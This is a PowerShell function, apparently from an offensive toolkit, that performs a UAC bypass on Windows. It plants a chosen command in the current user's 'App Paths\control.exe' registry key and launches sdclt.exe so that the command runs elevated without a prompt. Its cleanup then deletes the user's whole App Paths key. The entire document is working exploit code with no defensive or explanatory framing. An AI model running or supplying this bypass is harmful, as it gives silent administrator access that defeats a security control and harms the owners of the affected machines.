function BypassUAC-HackPlayers-sdclt {
param ([string]$comando)
$comando = "c:\Windows\System32\WindowsPowerShell\v1.0\" + $comando
$key = "registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
New-Item -Path $key -force | out-null
New-ItemProperty -Path $key -name '(Default)' -Value $comando -PropertyType string -Force | Out-Null
Start-Process sdclt.exe ; sleep -Seconds 3
Remove-Item -Path "registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\" -Force | out-null
}
